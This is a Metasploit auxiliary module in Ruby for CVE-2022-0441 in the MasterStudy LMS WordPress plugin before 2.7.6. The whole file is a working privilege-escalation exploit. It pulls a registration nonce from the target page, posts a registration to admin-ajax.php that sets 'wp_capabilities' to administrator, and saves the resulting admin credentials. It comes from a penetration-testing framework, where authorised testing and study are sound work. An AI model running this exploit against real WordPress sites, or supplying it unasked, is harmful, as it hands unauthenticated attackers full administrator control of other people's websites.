##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Wordpress MasterStudy Admin Account Creation',
        'Description' => %q{
          MasterStudy LMS, a WordPress plugin,
          prior to 2.7.6 is affected by a privilege escalation where an unauthenticated
          user is able to create an administrator account for wordpress itself.
        },
        'Author' => [
          'h00die', # msf module
          'Numan Türle', # edb
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2022-0441'],
          ['URL', 'https://gist.github.com/numanturle/4762b497d3b56f1a399ea69aa02522a6'],
          ['EDB', '50752'],
          ['WPVDB', '173c2efe-ee9c-4539-852f-c242b4f728ed']
        ],
        'DisclosureDate' => '2022-02-18',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )
    register_options(
      [
        OptString.new('USERNAME', [false, 'Username to register (blank will auto generate)', '']),
        OptString.new('PASSWORD', [false, 'Password (blank will auto generate)', '']),
        OptString.new('EMAIL', [false, 'Email to register (blank will auto generate)', ''])
      ]
    )
  end

  def check
    unless wordpress_and_online?
      return Msf::Exploit::CheckCode::Safe('Server not online or not detected as wordpress')
    end

    checkcode = check_plugin_version_from_readme('masterstudy-lms-learning-management-system', '2.7.6')
    if checkcode == Msf::Exploit::CheckCode::Safe
      return Msf::Exploit::CheckCode::Safe('MasterStudy LMS version not vulnerable')
    end

    checkcode
  end

  def get_username
    datastore['USERNAME'].blank? ? Faker::Internet.username : datastore['USERNAME']
  end

  def get_password
    datastore['PASSWORD'].blank? ? Rex::Text.rand_password : datastore['PASSWORD']
  end

  def get_email
    datastore['EMAIL'].blank? ? Faker::Internet.email : datastore['EMAIL']
  end

  def run
    username = get_username
    password = get_password
    email = get_email
    res = send_request_cgi('uri' => normalize_uri(target_uri.path))
    fail_with(Failure::Unreachable, 'Connection failed') unless res
    fail_with(Failure::UnexpectedReply, 'Request failed to return a successful response') unless res.code == 200
    /"stm_lms_register":"(?<nonce>\w{10})"/ =~ res.body
    fail_with(Failure::UnexpectedReply, 'Unabled to retrieve MasterStudy Nonce from page') if nonce.nil?

    print_status("Attempting with username: #{username} password: #{password} email: #{email}")
    json_post_data = JSON.pretty_generate({
      'user_login' => username,
      'user_email' => email,
      'user_password' => password,
      'user_password_re' => password,
      'become_instructor' => '',
      'privacy_policy' => true,
      'degree' => '',
      'expertize' => '',
      'auditory' => '',
      'additional' => [],
      'additional_instructors' => [],
      'profile_default_fields_for_register' => {
        'wp_capabilities' => {
          'value' => { 'administrator' => 1 }
        }
      }
    })
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
      'ctype' => 'application/json',
      'vars_get' => {
        'action' => 'stm_lms_register',
        'nonce' => nonce
      },
      'data' => json_post_data
    )
    fail_with(Failure::Unreachable, 'Connection failed') unless res
    fail_with(Failure::UnexpectedReply, 'Request Failed to return a successful response') unless res.code == 200
    results = res.get_json_document
    if results['status'] == 'success'
      print_good('Account Created Successfully')
      create_credential({
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: username,
        private_type: :password,
        private_data: password,
        service_name: 'Wordpress',
        address: datastore['RHOST'],
        port: datastore['RPORT'],
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED
      })
    else
      print_error("Account Creation Failed: #{results['message']}")
    end
  end
end
